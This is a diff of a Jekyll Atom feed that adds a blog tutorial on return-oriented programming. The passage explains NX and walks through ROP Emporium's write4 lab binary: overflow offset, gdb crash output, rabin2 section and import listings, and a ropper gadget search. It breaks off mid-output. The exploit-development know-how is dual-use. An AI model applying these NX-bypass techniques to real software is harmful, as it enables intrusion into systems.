@@ -1,4 +1,354 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-27T19:53:40-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Pentesting GreenOptic: 1</title><link href="http://localhost:4000/2020/07/21/pentesting-greenoptic-1.html" rel="alternate" type="text/html" title="Pentesting GreenOptic: 1" /><published>2020-07-21T00:00:00-04:00</published><updated>2020-07-21T00:00:00-04:00</updated><id>http://localhost:4000/2020/07/21/pentesting-greenoptic-1</id><content type="html" xml:base="http://localhost:4000/2020/07/21/pentesting-greenoptic-1.html">&lt;p&gt;Today, I will be writing up how I solved the &lt;a href=&quot;https://www.vulnhub.com/entry/greenoptic-1,510/#&quot;&gt;GreenOptic: 1&lt;/a&gt; challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-15T10:18:35-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Return Oriented Programming Tutorial</title><link href="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html" rel="alternate" type="text/html" title="Return Oriented Programming Tutorial" /><published>2020-10-14T00:00:00-04:00</published><updated>2020-10-14T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/14/return-oriented-programming-tutorial</id><content type="html" xml:base="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html">&lt;p&gt;In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to obtain execute code when NX is enabled. I will also be solving one of ROP Emporium’s challenges by using a ROP chain.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-is-nx&quot;&gt;What is NX?&lt;/h3&gt;
+
+&lt;p&gt;The NX bit stands for the “no-execute” bit, and it allows computers to mark certain sections of code as executable or non executable. If the process attempts to execute code that is marked as executable, then there will be no problems, but if the process attempts to execute code that is marked as non-executable, then the processor will refuse to execute that line of code.&lt;/p&gt;
+
+&lt;p&gt;In a typical stack overflow, the attacker “injects” shellcode into the stack, and then he/she overwrites the return address on the stack with a JMP RSP instruction. However, when NX is enabled, the stack is typically marked as non-executable, which means that we cannot simply place shellcode on the stack.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-are-rop-chains&quot;&gt;What are ROP Chains?&lt;/h3&gt;
+
+&lt;p&gt;Suppose we have a binary with NX enabled, and we have already figured out how to overwrite the return address and control RIP via buffer overflow. ROP chains will allow us to get around the problems that NX cause. The way this works is, we will make RIP point to a line of assembly code that is marked as executable in the binary instead of simply injecting our shellcode into the running process.&lt;/p&gt;
+
+&lt;p&gt;Since we have complete control over RIP, we can theoretically make the program jump to any address in the binary, but we will want to specifcally focus on finding one or a few lines of code in the program that end with a RET instruction. These lines of code will be referred to as a “ROP gadget.” Since each ROP gadget ends with a RET instruction, and since we can overwrite the return address multiple times, we can “chain” multiple ROP gadgets together to execute the code that we want.&lt;/p&gt;
+
+&lt;p&gt;Don’t worry if this doesn’t really make sense to you yet. It will make more sense when you look at an example.&lt;/p&gt;
+
+&lt;h3 id=&quot;a-basic-example&quot;&gt;A Basic Example&lt;/h3&gt;
+
+&lt;p&gt;I will be using &lt;a href=&quot;https://ropemporium.com/challenge/write4.html&quot;&gt;ROP Emporium’s Write4 Challenge&lt;/a&gt; in 64-bit as our target. When we run the target, we are given the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./write4 
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; AAAAAAAAAAAAAAA
+Thank you!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are able to overwrite the return address of the target after writing 40 bytes via buffer overflow.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*40 + 'BBBBBBBB')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; input
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb write4 
+GNU gdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 9.2-0ubuntu1~20.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 9.2
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type &lt;span class=&quot;s2&quot;&gt;&quot;show copying&quot;&lt;/span&gt; and &lt;span class=&quot;s2&quot;&gt;&quot;show warranty&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
+This GDB was configured as &lt;span class=&quot;s2&quot;&gt;&quot;x86_64-linux-gnu&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Type &lt;span class=&quot;s2&quot;&gt;&quot;show configuration&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;configuration details.
+For bug reporting instructions, please see:
+&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
+Find the GDB manual and other documentation resources online at:
+    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+
+For &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Type &lt;span class=&quot;s2&quot;&gt;&quot;apropos word&quot;&lt;/span&gt; to search &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commands related to &lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;...
+GEF &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux ready, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;gef&lt;span class=&quot;s1&quot;&gt;' to start, `gef config'&lt;/span&gt; to configure
+78 commands loaded &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GDB 9.2 using Python engine 3.8
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 2 commands could not be loaded, run &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;gef missing&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; to know why.
+/home/n/.gdbinit:2: Error &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;sourced &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;file:
+&lt;span class=&quot;nb&quot;&gt;source command &lt;/span&gt;requires file name of file to source.
+Reading symbols from write4...
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No debugging symbols found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;write4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+gef➤  r &amp;lt; input
+Starting program: /home/n/Documents/Exploitation/ropemporium/write4/write4 &amp;lt; input
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Thank you!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7dc7942 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;pwnme &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; from ./libwrite4.so
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Legend: Modified register | Code | Heap | Stack | String &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   : 0xb               
+&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   : 0x0000000000400630  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   : 0x00007ffff7cbf1e7  →  0x5177fffff0003d48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;H=&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   : 0x00007fffffffdd98  →  &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   : 0x4141414141414141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   : 0x00007ffff7d9a723  →  0xd9c4c0000000000a
+&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   : 0x00007ffff7d9c4c0  →  0x0000000000000000
+&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   : 0x00007ffff7dc7942  →  &amp;lt;pwnme+152&amp;gt; ret 
+&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    : 0xb               
+&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    : 0x2               
+&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   : 0x00007ffff7dc74c9  →  0x6972700064616572 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;read&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   : 0x246             
+&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   : 0x0000000000400520  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   : 0x00007fffffffde90  →  0x0000000000000001
+&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ZERO carry PARITY adjust sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow RESUME virtualx86 identification]
+&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;: 0x0033 &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;: 0x002b &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdd98│+0x0000: &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;	 ← &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+0x00007fffffffdda0│+0x0008: 0x000000000000000a
+0x00007fffffffdda8│+0x0010: 0x00007ffff7bd50b3  →  &amp;lt;__libc_start_main+243&amp;gt; mov edi, eax
+0x00007fffffffddb0│+0x0018: 0x00007ffff7ffc620  →  0x0005043c00000000
+0x00007fffffffddb8│+0x0020: 0x00007fffffffde98  →  0x00007fffffffe21b  →  &lt;span class=&quot;s2&quot;&gt;&quot;/home/n/Documents/Exploitation/ropemporium/write4/[...]&quot;&lt;/span&gt;
+0x00007fffffffddc0│+0x0028: 0x0000000100000000
+0x00007fffffffddc8│+0x0030: 0x0000000000400607  →  &amp;lt;main+0&amp;gt; push rbp
+0x00007fffffffddd0│+0x0038: 0x0000000000400630  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7dc793b &amp;lt;pwnme+145&amp;gt;      call   0x7ffff7dc7730 &amp;lt;puts@plt&amp;gt;
+   0x7ffff7dc7940 &amp;lt;pwnme+150&amp;gt;      nop    
+   0x7ffff7dc7941 &amp;lt;pwnme+151&amp;gt;      leave  
+ → 0x7ffff7dc7942 &amp;lt;pwnme+152&amp;gt;      ret    
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Cannot disassemble from &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt;
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] Id 1, Name: &quot;write4&quot;, stopped, reason: SIGSEGV&lt;/span&gt;
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] 0x7ffff7dc7942 → pwnme()&lt;/span&gt;
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By looking at the Rop Emporium website, we see that we are given the following information:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;There is a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(char* filename)&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;This function has been moved into a separate library, but a PLT entry for that function exists in the binary.&lt;/li&gt;
+  &lt;li&gt;Our goal is to call &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;You can input NULL bytes into the program, and the program will read them just fine.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Note that NX is enabled, so we can’t just execute a &lt;code class=&quot;highlighter-rouge&quot;&gt;JMP RSP&lt;/code&gt; instruction and put shellcode on the stack.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; write4
+&lt;span class=&quot;nb&quot;&gt;arch     &lt;/span&gt;x86
+baddr    0x400000
+binsz    6521
+bintype  elf
+bits     64
+canary   &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;class    ELF64
+compiler GCC: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 7.5.0-3ubuntu1~18.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 7.5.0
+crypto   &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;endian   little
+havecode &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;lsyms    &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;os       linux
+pcalign  0
+pic      &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;relocs   &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;relro    partial
+rpath    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+sanitiz  &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;static   &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;stripped &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;subsys   linux
+va       &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(char *filename)&lt;/code&gt; function, as we can see using rabin2, has a PLT entry that is located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00400510&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; write4
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Imports]
+nth vaddr      &lt;span class=&quot;nb&quot;&gt;bind   type   &lt;/span&gt;name
+―――――――――――――――――――――――――――――――――
+1   0x00400500 GLOBAL FUNC   pwnme
+2   0x00000000 GLOBAL FUNC   __libc_start_main
+3   0x00000000 WEAK   NOTYPE __gmon_start__
+4   0x00400510 GLOBAL FUNC   print_file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This means that we have two steps that we need to accomplish:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Load a pointer to the string “flag.txt” into RDI (in x86-64, RDI contains the first argument to a function).&lt;/li&gt;
+  &lt;li&gt;Overwrite the return address with &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00400510&lt;/code&gt; to call &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Unfortunately, there are no useful strings in the binary. This means that we need to somehow inject the “flag.txt” string into the process.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; write4
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Strings]
+nth paddr      vaddr      len size section &lt;span class=&quot;nb&quot;&gt;type  &lt;/span&gt;string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;writing-the-string&quot;&gt;Writing the String&lt;/h3&gt;
+
+&lt;p&gt;Using rabin2, we can see that there are several writeable sections in the binary. We can write our “flag.txt” string in the &lt;code class=&quot;highlighter-rouge&quot;&gt;.data&lt;/code&gt; section, which is writeable and is located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt;. Theoretically, the &lt;code class=&quot;highlighter-rouge&quot;&gt;.bss&lt;/code&gt; section should also work just fine.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; write4
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Sections]
+
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000    0x0 0x00000000    0x0 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; 
+1   0x00000238   0x1c 0x00400238   0x1c &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .interp
+2   0x00000254   0x20 0x00400254   0x20 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .note.ABI_tag
+3   0x00000274   0x24 0x00400274   0x24 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .note.gnu.build_id
+4   0x00000298   0x38 0x00400298   0x38 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .gnu.hash
+5   0x000002d0   0xf0 0x004002d0   0xf0 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .dynsym
+6   0x000003c0   0x7c 0x004003c0   0x7c &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .dynstr
+7   0x0000043c   0x14 0x0040043c   0x14 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .gnu.version
+8   0x00000450   0x20 0x00400450   0x20 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .gnu.version_r
+9   0x00000470   0x30 0x00400470   0x30 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .rela.dyn
+10  0x000004a0   0x30 0x004004a0   0x30 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .rela.plt
+11  0x000004d0   0x17 0x004004d0   0x17 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .init
+12  0x000004f0   0x30 0x004004f0   0x30 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .plt
+13  0x00000520  0x182 0x00400520  0x182 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .text
+14  0x000006a4    0x9 0x004006a4    0x9 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .fini
+15  0x000006b0   0x10 0x004006b0   0x10 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .rodata
+16  0x000006c0   0x44 0x004006c0   0x44 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .eh_frame_hdr
+17  0x00000708  0x120 0x00400708  0x120 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .eh_frame
+18  0x00000df0    0x8 0x00600df0    0x8 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .init_array
+19  0x00000df8    0x8 0x00600df8    0x8 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .fini_array
+20  0x00000e00  0x1f0 0x00600e00  0x1f0 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .dynamic
+21  0x00000ff0   0x10 0x00600ff0   0x10 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .got
+22  0x00001000   0x28 0x00601000   0x28 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .got.plt
+23  0x00001028   0x10 0x00601028   0x10 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .data
+24  0x00001038    0x0 0x00601038    0x8 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .bss
+25  0x00001038   0x29 0x00000000   0x29 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .comment
+26  0x00001068  0x618 0x00000000  0x618 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .symtab
+27  0x00001680  0x1f6 0x00000000  0x1f6 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .strtab
+28  0x00001876  0x103 0x00000000  0x103 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .shstrtab
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;“flag.txt” written as a Python byte array is &lt;code class=&quot;highlighter-rouge&quot;&gt;b'\x66\x6c\x61\x67\x2e\x74\x78\x74'&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python
+Python 3.8.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Jul 28 2020, 12:59:40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 9.3.0] on linux
+Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a.encode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.hex&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;'666c61672e747874'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we know that we need to write the bytes &lt;code class=&quot;highlighter-rouge&quot;&gt;0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74&lt;/code&gt; (“flag.txt” written in hex) at memory location &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt;. Alright, so how do we actually accomplish this? The first step would be to search for some code in the binary that is in the form &lt;code class=&quot;highlighter-rouge&quot;&gt;mov [%], %; ret&lt;/code&gt;. If we could find code that does this, then we could write the hex bytes for “flag.txt” at memory location &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt; by modifying the registers accordingly and jumping to that line of code.&lt;/p&gt;
+
+&lt;p&gt;We can find a line of code in this form by using a tool called ropper. Ropper allows us to easily find ROP gadgets in binaries that we can use.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; write4 &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mov [%], %; ret&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: mov &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;%], %&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: write4
+0x00000000004005e2: mov byte ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip + 0x200a4f], 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop rbp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
